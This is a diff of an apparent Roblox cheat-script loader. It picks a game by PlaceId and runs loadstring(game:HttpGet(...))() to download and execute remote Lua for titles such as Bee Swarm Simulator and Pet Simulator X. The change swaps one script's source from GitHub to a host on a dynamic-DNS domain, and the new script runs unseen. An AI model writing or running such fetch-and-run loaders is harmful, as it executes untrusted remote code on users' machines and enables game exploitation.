@@ -1,5 +1,5 @@
 if game.PlaceId == 1537690962 then ----------------------------------------------bee swarm simulator-------------------------------------------------
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/kocmoc/main/games/bss.lua"))()
+	loadstring(game:HttpGet("https://roblox.servegame.com/roblox_bss/chocmoc.lua"))()
 elseif game.PlaceId ==  9993529229 then --------------------------------------Counter blox remasterd vape v4-----------------------------------------
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/DOG393831/Multi-Thingy-roblox-script/main/CBRO%20Vape%20v4"))()
 elseif game.PlaceId ==  6284583030 then --------------------------------------------pet sim x--------------------------------------------------------
